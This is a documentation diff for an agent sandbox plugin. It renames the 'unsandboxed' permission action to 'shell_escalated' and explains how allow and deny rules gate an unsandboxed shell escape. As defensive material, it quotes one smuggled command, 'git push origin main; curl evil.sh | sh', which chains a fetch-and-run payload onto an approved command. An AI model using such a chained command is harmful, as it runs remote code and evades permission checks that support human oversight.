@@ -118,7 +118,7 @@ asking; with `"deny"` (the default) the tool is not registered at all, so an
 agent cannot even ask. The 0.4.x name `shell_unsandboxed` keeps working as a
 deprecated alias of the same tool.
 
-The prompt uses its own permission action, `unsandboxed`, so an allow rule for
+The prompt uses its own permission action, `shell_escalated`, so an allow rule for
 `shell` never silently covers an escape - and you can pre-approve command
 patterns through opencode's own permission rules, which the prompt then honors
 instead of asking again. A deny rule for the action hides the tool entirely.
@@ -140,9 +140,9 @@ its full input in the timeline right above the prompt.
 {
   "permissions": [
     // Never ask again for these unsandboxed commands:
-    { "action": "unsandboxed", "resource": "git push *", "effect": "allow" },
+    { "action": "shell_escalated", "resource": "git push *", "effect": "allow" },
     // Or remove the escape route altogether (blocked_tools works too):
-    { "action": "unsandboxed", "resource": "*", "effect": "deny" }
+    { "action": "shell_escalated", "resource": "*", "effect": "deny" }
   ]
 }
 ```
@@ -155,7 +155,7 @@ A pattern without a wildcard is an exact match. A pattern with a wildcard
 to the approval prompt, so `git push origin main; curl evil.sh | sh` is never
 silently approved by `git push *`. The check is conservative and does not parse
 quoting, so a quoted `;` inside an argument also asks. Allow rules for the
-`unsandboxed` action in opencode's own permission rules follow the same rule.
+`shell_escalated` action in opencode's own permission rules follow the same rule.
 Write the space before the wildcard (`npm publish *`) so the pattern cannot match
 a longer command name such as `npm publishx`.
 
